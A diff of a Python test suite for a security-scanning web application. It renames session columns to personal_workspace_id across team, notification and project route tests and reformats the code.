+                    "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                     "content_type, preview_type, content_sha256, created) "
                     "VALUES (?, ?, ?, 'reports/team-artifact.txt', 'team-artifact.txt', 'output', ?, "
                     "'workspace_flag', 'text/plain', 'text', ?, ?)",
@@ -5071,10 +5051,10 @@ class TestTeamRoutes:
             assert artifact_preview.status_code == 200
             assert artifact_preview.get_json()["text"] == artifact_body.decode("utf-8")
             assert artifact_label.status_code == 201
-            assert artifact_label.get_json()["label"]["session_id"] == operator_token
+            assert artifact_label.get_json()["label"]["personal_workspace_id"] == operator_token
             assert artifact_label.get_json()["label"]["team_id"] == team_id
             assert artifact_note.status_code == 200
-            assert artifact_note.get_json()["note"]["session_id"] == operator_token
+            assert artifact_note.get_json()["note"]["personal_workspace_id"] == operator_token
             assert artifact_note.get_json()["note"]["team_id"] == team_id
             assert personal_artifacts.status_code == 404
             assert package_created.status_code == 201
@@ -5125,29 +5105,30 @@ class TestTeamRoutes:
             assert package_job_download.status_code == 200
             package_job_download.close()
             from services.projects import package_jobs
+
             job_record = package_jobs._read_job(package_job["id"])
             assert job_record is not None
-            assert job_record["session_id"] == operator_token
+            assert job_record["personal_workspace_id"] == operator_token
             assert job_record["team_id"] == team_id
             assert job_record["actor_member_id"] == operator_member_id
             with db_connect() as conn:
                 package_row = conn.execute(
-                    "SELECT session_id FROM evidence_packages WHERE id = ?",
+                    "SELECT personal_workspace_id FROM evidence_packages WHERE id = ?",
                     (package["id"],),
                 ).fetchone()
                 metadata_row = conn.execute(
-                    "SELECT session_id, team_id FROM entity_labels WHERE entity_type = 'package' AND entity_id = ?",
+                    "SELECT personal_workspace_id, team_id FROM entity_labels WHERE entity_type = 'package' AND entity_id = ?",
                     (package["id"],),
                 ).fetchone()
                 artifact_metadata_row = conn.execute(
-                    "SELECT session_id, team_id FROM entity_labels "
+                    "SELECT personal_workspace_id, team_id FROM entity_labels "
                     "WHERE entity_type = 'run_file_artifact' AND entity_id = ?",
                     (artifact_id,),
                 ).fetchone()
-            assert package_row["session_id"] == operator_token
-            assert metadata_row["session_id"] == operator_token
+            assert package_row["personal_workspace_id"] == operator_token
+            assert metadata_row["personal_workspace_id"] == operator_token
             assert metadata_row["team_id"] == team_id
-            assert artifact_metadata_row["session_id"] == operator_token
+            assert artifact_metadata_row["personal_workspace_id"] == operator_token
             assert artifact_metadata_row["team_id"] == team_id
         finally:
             for patcher in reversed(patchers):
@@ -5188,9 +5169,13 @@ class TestTeamRoutes:
                     json={"path": "shared/notes.txt", "text": "team notes\n"},
                 )
                 from services.teams.capabilities import Capability, ROLE_CAPABILITIES
-                with mock.patch.dict(ROLE_CAPABILITIES, {
-                    "operator": frozenset({Capability.VIEW_TEAM, Capability.MANAGE_WORKSPACE_FILES}),
-                }):
+
+                with mock.patch.dict(
+                    ROLE_CAPABILITIES,
+                    {
+                        "operator": frozenset({Capability.VIEW_TEAM, Capability.MANAGE_WORKSPACE_FILES}),
+                    },
+                ):
                     label = client.post(
                         "/entities/workspace_file/shared/notes.txt/labels",
                         headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
@@ -5259,21 +5244,19 @@ class TestTeamRoutes:
             assert moved_read.get_json()["note"]["body"] == "Shared team context."
             with db_connect() as conn:
                 metadata_rows = conn.execute(
-                    "SELECT session_id, team_id, entity_type, entity_id FROM entity_labels "
+                    "SELECT personal_workspace_id, team_id, entity_type, entity_id FROM entity_labels "
                     "WHERE entity_type = 'workspace_file' AND label = 'handoff'",
                 ).fetchall()
                 note_rows = conn.execute(
-                    "SELECT session_id, team_id, entity_type, entity_id FROM entity_notes "
+                    "SELECT personal_workspace_id, team_id, entity_type, entity_id FROM entity_notes "
                     "WHERE entity_type = 'workspace_file' AND body = 'Shared team context.'",
                 ).fetchall()
-            assert [
-                (row["session_id"], row["team_id"], row["entity_id"])
-                for row in metadata_rows
-            ] == [(operator_token, team_id, "shared/moved.txt")]
-            assert [
-                (row["session_id"], row["team_id"], row["entity_id"])
-                for row in note_rows
-            ] == [(operator_token, team_id, "shared/moved.txt")]
+            assert [(row["personal_workspace_id"], row["team_id"], row["entity_id"]) for row in metadata_rows] == [
+                (operator_token, team_id, "shared/moved.txt")
+            ]
+            assert [(row["personal_workspace_id"], row["team_id"], row["entity_id"]) for row in note_rows] == [
+                (operator_token, team_id, "shared/moved.txt")
+            ]
             with mock.patch.dict(shell_app_module.CFG, workspace_cfg, clear=False):
                 deleted = client.delete(
                     "/workspace/files?path=shared/moved.txt",
@@ -5435,16 +5418,22 @@ class TestTeamRoutes:
                 headers={"X-Session-ID": owner_token},
                 json={"role": "viewer", "label": "Notification viewer"},
             )
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": admin_token},
-                json={"code": admin_invite.get_json()["invite"]["code"], "display_name": "Notification admin"},
-            ).status_code == 201
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": viewer_token},
-                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Notification viewer"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": admin_token},
+                    json={"code": admin_invite.get_json()["invite"]["code"], "display_name": "Notification admin"},
+                ).status_code
+                == 201
+            )
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": viewer_token},
+                    json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Notification viewer"},
+                ).status_code
+                == 201
+            )
 
             team_headers = {"X-Session-ID": admin_token, "X-Team-ID": team_id}
             created_channel = client.post(
@@ -5487,11 +5476,11 @@ class TestTeamRoutes:
                 )
                 conn.commit()
                 channel_row = conn.execute(
-                    "SELECT session_token, team_id FROM notification_channels WHERE id = ?",
+                    "SELECT personal_workspace_id, team_id FROM notification_channels WHERE id = ?",
                     (channel["id"],),
                 ).fetchone()
                 event_row = conn.execute(
-                    "SELECT session_token, team_id FROM notification_events WHERE id = ?",
+                    "SELECT personal_workspace_id, team_id FROM notification_events WHERE id = ?",
                     (event_ids[0],),
                 ).fetchone()
 
@@ -5510,8 +5499,8 @@ class TestTeamRoutes:
             assert admin_personal_channels.get_json()["channels"] == []
             assert viewer_create.status_code == 403
             assert viewer_create.get_json()["error"] == "team_forbidden"
-            assert dict(channel_row) == {"session_token": admin_token, "team_id": team_id}
-            assert dict(event_row) == {"session_token": admin_token, "team_id": team_id}
+            assert dict(channel_row) == {"personal_workspace_id": admin_token, "team_id": team_id}
+            assert dict(event_row) == {"personal_workspace_id": admin_token, "team_id": team_id}
             assert viewer_team_events.status_code == 200
             assert viewer_team_events.get_json()["total"] == 1
             assert viewer_team_events.get_json()["events"][0]["team_id"] == team_id
@@ -5547,16 +5536,22 @@ class TestTeamRoutes:
             )
             assert operator_invite.status_code == 201
             assert viewer_invite.status_code == 201
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": operator_token},
-                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "AI operator"},
-            ).status_code == 201
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": viewer_token},
-                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "AI viewer"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": operator_token},
+                    json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "AI operator"},
+                ).status_code
+                == 201
+            )
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": viewer_token},
+                    json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "AI viewer"},
+                ).status_code
+                == 201
+            )
 
             run_id = "run-team-ai-assist"
             output_rows = [
@@ -5582,7 +5577,7 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count) "
                     "VALUES (?, ?, ?, 'external', 'nmap -sV darklab.sh', ?, ?, 0, ?, ?)",
                     (
@@ -5611,8 +5606,10 @@ class TestTeamRoutes:
                 "ai_rate_limit_global_per_minute": 20,
                 "share_redaction_enabled": False,
             }
-            with mock.patch.dict(config.CFG, ai_cfg_patch), \
-                 mock.patch.object(process, "redis_client", process._FakeRedisClient()):
+            with (
+                mock.patch.dict(config.CFG, ai_cfg_patch),
+                mock.patch.object(process, "redis_client", process._FakeRedisClient()),
+            ):
                 queued = client.post(f"/runs/{run_id}/ai-summary", json={}, headers=team_headers)
                 listed_for_owner = client.get(f"/runs/{run_id}/ai-assists", headers=owner_team_headers)
                 listed_for_viewer = client.get(f"/runs/{run_id}/ai-assists", headers=viewer_team_headers)
@@ -5627,7 +5624,7 @@ class TestTeamRoutes:
                 queued_payload = queued.get_json()
                 with db_connect() as conn:
                     assist_row = conn.execute(
-                        "SELECT session_id, team_id FROM ai_run_assists WHERE id = ?",
+                        "SELECT personal_workspace_id, team_id FROM ai_run_assists WHERE id = ?",
                         (queued_payload["assist"]["id"],),
                     ).fetchone()
                     conn.execute(
@@ -5645,7 +5642,7 @@ class TestTeamRoutes:
 
             assert queued.status_code == 202
             assert queued_payload["assist"]["status"] == "queued"
-            assert assist_row["session_id"] == operator_token
+            assert assist_row["personal_workspace_id"] == operator_token
             assert assist_row["team_id"] == team_id
             assert listed_for_owner.status_code == 200
             assert [item["id"] for item in listed_for_owner.get_json()["assists"]] == [queued_payload["assist"]["id"]]
@@ -5705,14 +5702,14 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, '', 'external', 'httpx personal.example', ?, ?, 0, '[]', 0, '')",
                     (personal_run_id, owner_token, seen_at, seen_at),
                 )
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, ?, 'external', 'httpx shared.example', ?, ?, 0, '[]', 0, '')",
                     (team_run_id, owner_token, team_id, seen_at, seen_at),
@@ -5723,7 +5720,8 @@ class TestTeamRoutes:
                 ):
                     conn.execute(
                         "INSERT INTO entities "
-                        "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
+                        "(id, personal_workspace_id, type, canonical_value, signature_hash, "
+                        "first_seen_at, last_seen_at, created) "
                         "VALUES (?, ?, 'domain', ?, ?, ?, ?, ?)",
                         (entity_id, owner_token, value, "sig_" + entity_id, seen_at, seen_at, seen_at),
                     )
@@ -5739,7 +5737,7 @@ class TestTeamRoutes:
                 ):
                     conn.execute(
                         "INSERT INTO entities "
-                        "(id, session_id, type, canonical_value, signature_hash, host_entity_id, "
+                        "(id, personal_workspace_id, type, canonical_value, signature_hash, host_entity_id, "
                         "first_seen_at, last_seen_at, created) "
                         "VALUES (?, ?, 'url', ?, ?, ?, ?, ?, ?)",
                         (entity_id, owner_token, value, "sig_" + entity_id, team_entity_id, seen_at, seen_at, seen_at),
@@ -5756,7 +5754,7 @@ class TestTeamRoutes:
                 ):
                     conn.execute(
                         "INSERT INTO findings "
-                        "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, "
+                        "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, severity, "
                         "kind, tool_root, first_run_id, last_run_id, first_seen_at, last_seen_at, "
                         "occurrence_count, status, title, raw_line, created) "
                         "VALUES (?, ?, ?, ?, ?, ?, 'medium', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
@@ -5853,14 +5851,14 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, ?, 'external', 'httpx metadata.example', ?, ?, 0, '[]', 0, '')",
                     (run_id, owner_token, team_id, seen_at, seen_at),
                 )
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                     "VALUES (?, ?, 'domain', 'metadata.example', ?, ?, ?, ?)",
                     (entity_id, owner_token, "sig_" + entity_id, seen_at, seen_at, seen_at),
                 )
@@ -5872,7 +5870,7 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
+                    "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                     "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, raw_line, created) "
                     "VALUES (?, ?, ?, ?, ?, ?, 'medium', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                     (
@@ -5956,14 +5954,14 @@ class TestTeamRoutes:
             assert operator_personal_labels.status_code == 404
             with db_connect() as conn:
                 metadata_rows = conn.execute(
-                    "SELECT session_id, team_id FROM entity_labels WHERE entity_id = ?",
+                    "SELECT personal_workspace_id, team_id FROM entity_labels WHERE entity_id = ?",
                     (entity_id,),
                 ).fetchall()
                 finding_status = conn.execute(
                     "SELECT status FROM findings WHERE id = ?",
                     (finding_id,),
                 ).fetchone()
-            assert {row["session_id"] for row in metadata_rows} == {operator_token}
+            assert {row["personal_workspace_id"] for row in metadata_rows} == {operator_token}
             assert {row["team_id"] for row in metadata_rows} == {team_id}
             assert finding_status["status"] == "reviewed"
         finally:
@@ -6252,9 +6250,7 @@ class TestNotificationChannelRoutes:
                 )
             ]
             with db_connect() as conn:
-                rows = conn.execute(
-                    "SELECT channel_id, status FROM notification_events ORDER BY created"
-                ).fetchall()
+                rows = conn.execute("SELECT channel_id, status FROM notification_events ORDER BY created").fetchall()
             assert [(row["channel_id"], row["status"]) for row in rows] == [(second["id"], "sent")]
             assert first["id"] != second["id"]
         finally:
@@ -6302,7 +6298,7 @@ class TestNotificationChannelRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO notification_events "
-                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
+                    "(id, personal_workspace_id, channel_id, trigger, payload_json, status, attempts, "
                     "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                     (
@@ -6323,7 +6319,7 @@ class TestNotificationChannelRoutes:
                 )
                 conn.execute(
                     "INSERT INTO notification_events "
-                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
+                    "(id, personal_workspace_id, channel_id, trigger, payload_json, status, attempts, "
                     "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                     (
@@ -6331,19 +6327,21 @@ class TestNotificationChannelRoutes:
                         session_id,
                         channel_id,
                         "project_digest",
-                        json.dumps({
-                            "trigger": "project_digest",
-                            "project_id": "prj_delivery_audit",
-                            "project_name": "External Edge",
-                            "project_monitoring_url": "/projects/prj_delivery_audit/monitoring",
-                            "digest_identity": {
+                        json.dumps(
+                            {
+                                "trigger": "project_digest",
                                 "project_id": "prj_delivery_audit",
-                                "session_id": session_id,
-                                "team_id": "",
-                                "window_start": "2026-05-22T06:00:00+00:00",
-                                "window_end": "2026-05-22T07:00:00+00:00",
-                            },
-                        }),
+                                "project_name": "External Edge",
+                                "project_monitoring_url": "/projects/prj_delivery_audit/monitoring",
+                                "digest_identity": {
+                                    "project_id": "prj_delivery_audit",
+                                    "session_id": session_id,
+                                    "team_id": "",
+                                    "window_start": "2026-05-22T06:00:00+00:00",
+                                    "window_end": "2026-05-22T07:00:00+00:00",
+                                },
+                            }
+                        ),
                         "dead",
                         3,
                         "",
@@ -6356,7 +6354,7 @@ class TestNotificationChannelRoutes:
                 )
                 conn.execute(
                     "INSERT INTO notification_events "
-                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
+                    "(id, personal_workspace_id, channel_id, trigger, payload_json, status, attempts, "
                     "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                     (
@@ -6421,7 +6419,7 @@ class TestNotificationChannelRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO notification_events "
-                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
+                    "(id, personal_workspace_id, channel_id, trigger, payload_json, status, attempts, "
                     "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                     (
@@ -6462,15 +6460,15 @@ class TestNotificationChannelRoutes:
             assert delivered[0][0] == "https://example.invalid/hook"
             with db_connect() as conn:
                 source_channel_count = conn.execute(
-                    "SELECT COUNT(*) AS count FROM notification_channels WHERE session_token = ?",
+                    "SELECT COUNT(*) AS count FROM notification_channels WHERE personal_workspace_id = ?",
                     (source_session_id,),
                 ).fetchone()["count"]
                 migrated_event = conn.execute(
-                    "SELECT session_token FROM notification_events WHERE id = ?",
+                    "SELECT personal_workspace_id FROM notification_events WHERE id = ?",
                     ("nte_migrates_with_channel",),
                 ).fetchone()
             assert int(source_channel_count) == 0
-            assert migrated_event["session_token"] == destination_token
+            assert migrated_event["personal_workspace_id"] == destination_token
         finally:
             for patcher in reversed(patchers):
                 patcher.stop()
@@ -6524,6 +6522,7 @@ class TestNotificationChannelRoutes:
 
 # ── /projects ────────────────────────────────────────────────────────────────
 
+
 class TestProjectRoutes:
     def _session_id(self, prefix="projects"):
         return anonymous_session_id(f"{prefix}-{uuid.uuid4().hex[:8]}")
@@ -6562,10 +6561,7 @@ class TestProjectRoutes:
             json={"code": invite.get_json()["invite"]["code"], "display_name": display_name},
         )
         assert joined.status_code in {200, 201}
-        return next(
-            member for member in joined.get_json()["members"]
-            if member["display_name"] == display_name
-        )
+        return next(member for member in joined.get_json()["members"] if member["display_name"] == display_name)
 
     def _create_project(self, client, session_id, name="External Review", *, headers=None):
         resp = client.post(
@@ -6591,7 +6587,7 @@ class TestProjectRoutes:
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, team_id, run_kind, owner_tab_id, command, started, output_preview, "
+                "(id, personal_workspace_id, team_id, run_kind, owner_tab_id, command, started, output_preview, "
                 "output_line_count) "
                 f"VALUES (?, ?, ?, ?, ?, ?, {started}, ?, 0)",
                 (run_id, session_id, team_id, run_kind, owner_tab_id, command, "[]"),
@@ -6603,8 +6599,7 @@ class TestProjectRoutes:
         snapshot_id = snapshot_id or "snap-" + uuid.uuid4().hex
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
-                "INSERT INTO snapshots (id, session_id, label, created, content) "
-                "VALUES (?, ?, ?, datetime('now'), ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                 (snapshot_id, session_id, label, "[]"),
             )
             conn.commit()
@@ -6702,8 +6697,7 @@ class TestProjectRoutes:
         )
         assert missing_username.status_code == 400
         assert missing_username.get_json()["error"] == (
-            "HTTP profile Secret references aren't available in this Project scope: "
-            "Basic username Secret"
+            "HTTP profile Secret references aren't available in this Project scope: Basic username Secret"
         )
 
         detail_route = f"{route}/{created['id']}"
@@ -6765,7 +6759,7 @@ class TestProjectRoutes:
         assert created.status_code == 201
         assert created.get_json()["profile"]["allowed_hosts"] == [valid_target]
         assert warning_log.call_count == 2
-        event, = warning_log.call_args.args
+        (event,) = warning_log.call_args.args
         fields = warning_log.call_args.kwargs["extra"]
         assert event == "PROJECT_HTTP_PROFILE_INVALID_TARGETS_SKIPPED"
         assert fields == {
@@ -6783,8 +6777,10 @@ class TestProjectRoutes:
         project = self._create_project(client, session_id, name="Overview Empty")
         foreign_project = self._create_project(client, foreign_session, name="Overview Foreign")
 
-        with mock.patch.object(project_routes.log, "debug") as debug_log, \
-             mock.patch.object(project_routes.log, "info") as info_log:
+        with (
+            mock.patch.object(project_routes.log, "debug") as debug_log,
+            mock.patch.object(project_routes.log, "info") as info_log,
+        ):
             resp = client.get(
                 f"/projects/{project['id']}/overview",
                 headers={"X-Session-ID": session_id},
@@ -6838,11 +6834,14 @@ class TestProjectRoutes:
         session_id = self._session_id("project-overview-error")
         project = self._create_project(client, session_id, name="Overview Error")
 
-        with mock.patch.object(
-            project_routes,
-            "get_project_intel_overview",
-            side_effect=RuntimeError("overview exploded"),
-        ), mock.patch.object(project_routes.log, "error") as error_log:
+        with (
+            mock.patch.object(
+                project_routes,
+                "get_project_intel_overview",
+                side_effect=RuntimeError("overview exploded"),
+            ),
+            mock.patch.object(project_routes.log, "error") as error_log,
+        ):
             with pytest.raises(RuntimeError, match="overview exploded"):
                 client.get(
                     f"/projects/{project['id']}/overview?window_start=2026-01-01T00:00:00Z",
@@ -6880,30 +6879,32 @@ class TestProjectRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO entity_intel_snapshots "
-                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at, expires_at) "
+                "(id, personal_workspace_id, entity_id, provider, status, summary, data_json, fetched_at, expires_at) "
                 "VALUES (?, ?, ?, 'censys', 'ok', ?, ?, ?, ?)",
                 (
                     snapshot_id,
                     session_id,
                     target["id"],
                     "Censys route overview",
-                    json.dumps({
-                        "providers": {
-                            "censys": {
-                                "ports": [443],
-                                "services": ["https"],
-                                "certificate": {"not_after": expires_at},
+                    json.dumps(
+                        {
+                            "providers": {
+                                "censys": {
+                                    "ports": [443],
+                                    "services": ["https"],
+                                    "certificate": {"not_after": expires_at},
+                                },
                             },
-                        },
-                        "summary": {"has_intel": True, "providers_with_data": ["censys"]},
-                    }),
+                            "summary": {"has_intel": True, "providers_with_data": ["censys"]},
+                        }
+                    ),
                     now,
                     expires_at,
                 ),
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, entity_id, target_id, subject_key, signature_hash, severity, status, "
+                "(id, personal_workspace_id, entity_id, target_id, subject_key, signature_hash, severity, status, "
                 "title, created, last_seen_at) "
                 "VALUES (?, ?, ?, ?, ?, ?, 'high', 'new', ?, ?, ?)",
                 (
@@ -7046,22 +7047,23 @@ class TestProjectRoutes:
             conn.commit()
 
         resp = client.get(
-            f"/projects/{project['id']}/overview"
-            "?window_start=2026-05-20T09:00:00Z&window_end=2026-05-20T10:00:00Z",
+            f"/projects/{project['id']}/overview?window_start=2026-05-20T09:00:00Z&window_end=2026-05-20T10:00:00Z",
             headers={"X-Session-ID": session_id},
         )
 
         assert resp.status_code == 200
         payload = resp.get_json()
         assert payload["rollups"]["recent_change_state"] == "windowed"
-        assert payload["recent_changes"] == [{
-            "fire_id": window_fire.id,
-            "watcher_id": watcher.id,
-            "severity": "critical",
-            "state": "changed",
-            "target_ids": [target["id"]],
-            "created": "2026-05-20T09:30:00+00:00",
-        }]
+        assert payload["recent_changes"] == [
+            {
+                "fire_id": window_fire.id,
+                "watcher_id": watcher.id,
+                "severity": "critical",
+                "state": "changed",
+                "target_ids": [target["id"]],
+                "created": "2026-05-20T09:30:00+00:00",
+            }
+        ]
         assert old_fire.id not in json.dumps(payload["recent_changes"])
         assert payload["targets"][0]["source_flags"]["has_recent_changes"] is True
         assert payload["targets"][0]["recent_change_markers"][0]["fire_id"] == window_fire.id
@@ -7223,8 +7225,7 @@ class TestProjectRoutes:
                 headers={"X-Session-ID": session_id},
             )
             window_summary_resp = client.get(
-                f"/projects/{project['id']}/monitoring/summary"
-                "?window_start=2026-01-01T00:00:00Z&window_end=2027-01-01T00:00:00Z",
+                f"/projects/{project['id']}/monitoring/summary?window_start=2026-01-01T00:00:00Z&window_end=2027-01-01T00:00:00Z",
                 headers={"X-Session-ID": session_id},
             )
 
@@ -7283,7 +7284,8 @@ class TestProjectRoutes:
             "window_fire_count": 0,
         }
         window_summary_viewed = [
-            call for call in info_log.call_args_list
+            call
+            for call in info_log.call_args_list
             if call.args == ("PROJECT_MONITORING_SUMMARY_VIEWED",) and call.kwargs["extra"]["windowed"]
         ][0]
         assert window_summary_viewed.kwargs["extra"]["changed_count"] == 1
@@ -7404,7 +7406,7 @@ class TestProjectRoutes:
             ):
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
                     "occurrence_count, suppressed, created) "
                     "VALUES (?, ?, 'domain', ?, ?, ?, ?, 1, ?, ?)",
                     (entity_id, owner, value, f"sig_{entity_id}", now, now, suppressed, now),
@@ -7424,11 +7426,13 @@ class TestProjectRoutes:
         assert resp.status_code == 200
         payload = resp.get_json()
         assert payload["monitors"][0]["id"] == watcher.id
-        assert payload["filter_options"]["targets"] == [{
-            "id": visible_entity_id,
-            "type": "domain",
-            "value": "visible.darklab.sh",
-        }]
+        assert payload["filter_options"]["targets"] == [
+            {
+                "id": visible_entity_id,
+                "type": "domain",
+                "value": "visible.darklab.sh",
+            }
+        ]
         assert [target["value"] for target in payload["monitors"][0]["linked_targets"]] == ["visible.darklab.sh"]
 
     def test_project_monitoring_fire_ack_route_updates_fire_and_audits_metadata(self):
@@ -7528,7 +7532,7 @@ class TestProjectRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO risk_escalations ("
-                "id, owner_session_id, remediation_id, cve_id, source, transition_kind, "
+                "id, personal_workspace_id, remediation_id, cve_id, source, transition_kind, "
                 "feed_version, observation_count, created_at, updated_at"
                 ") VALUES (?, ?, ?, ?, 'kev', 'kev_added', '2026.08.04', 2, ?, ?)",
                 (
@@ -7575,11 +7579,7 @@ class TestProjectRoutes:
             "transition_kind": "kev_added",
         }
         assert note not in json.dumps(audit_rows[0]["details"])
-        updated_log = next(
-            call
-            for call in info_log.call_args_list
-            if call.args == ("PROJECT_RISK_ESCALATION_ACK_UPDATED",)
-        )
+        updated_log = next(call for call in info_log.call_args_list if call.args == ("PROJECT_RISK_ESCALATION_ACK_UPDATED",))
         assert updated_log.kwargs["extra"] == {
             "ip": mock.ANY,
             "session": get_log_session_id(session_id),
@@ -7648,7 +7648,8 @@ class TestProjectRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, team_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
+                "(id, personal_workspace_id, team_id, run_kind, command, started, finished, "
+                "exit_code, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, 'external', ?, ?, ?, 0, ?, 1)",
                 (
                     baseline_run_id,
@@ -7662,7 +7663,8 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, team_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
+                "(id, personal_workspace_id, team_id, run_kind, command, started, finished, "
+                "exit_code, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, 'external', ?, ?, ?, 0, ?, 2)",
                 (
                     current_run_id,
@@ -7789,7 +7791,7 @@ class TestProjectRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO notification_channels "
-                    "(id, session_token, team_id, kind, label, secrets_json, config_json, triggers_json, "
+                    "(id, personal_workspace_id, team_id, kind, label, secrets_json, config_json, triggers_json, "
                     "muted, created, updated) "
                     "VALUES ('ntc_digest_route', ?, ?, 'webhook', 'Digest route', '{}', '{}', '[]', 0, "
                     "'2026-06-15T10:00:00+00:00', '2026-06-15T10:00:00+00:00')",
@@ -7836,7 +7838,7 @@ class TestProjectRoutes:
             monitoring_get = client.get(f"/projects/{project['id']}/monitoring", headers=operator_headers)
             with db_connect() as conn:
                 digest_schedules = conn.execute(
-                    "SELECT session_token, cadence_preset FROM schedules "
+                    "SELECT personal_workspace_id, cadence_preset FROM schedules "
                     "WHERE owner_kind = 'project_digest' AND owner_id = ? AND team_id = ?",
                     (project["id"], team_id),
                 ).fetchall()
@@ -7854,7 +7856,7 @@ class TestProjectRoutes:
             assert operator_payload["digest_settings"]["cadence_preset"] == "weekly"
             assert operator_payload["digest_settings"]["channel_ids"] == ["ntc_digest_route"]
             assert operator_payload["digest_settings"]["quiet_no_change"] is True
-            assert operator_payload["digest_settings"]["session_id"] == owner_token
+            assert operator_payload["digest_settings"]["personal_workspace_id"] == owner_token
             assert owner_get_after_operator_patch.status_code == 200
             assert owner_get_after_operator_patch.get_json()["digest_settings"]["enabled"] is True
             assert owner_get_after_operator_patch.get_json()["digest_settings"]["cadence_preset"] == "weekly"
@@ -7866,9 +7868,7 @@ class TestProjectRoutes:
             assert monitoring_get.status_code == 200
             assert monitoring_get.get_json()["digest_settings"]["cadence_preset"] == "daily"
             assert monitoring_get.get_json()["can_manage_digest_settings"] is True
-            assert [(row["session_token"], row["cadence_preset"]) for row in digest_schedules] == [
-                (owner_token, "daily")
-            ]
+            assert [(row["personal_workspace_id"], row["cadence_preset"]) for row in digest_schedules] == [(owner_token, "daily")]
         finally:
             for patcher in reversed(patchers):
                 patcher.stop()
@@ -7945,11 +7945,14 @@ class TestProjectRoutes:
         session_id = self._session_id("project-delete-audit-failure")
         project = self._create_project(client, session_id, name="Audit Delete Rollback")
 
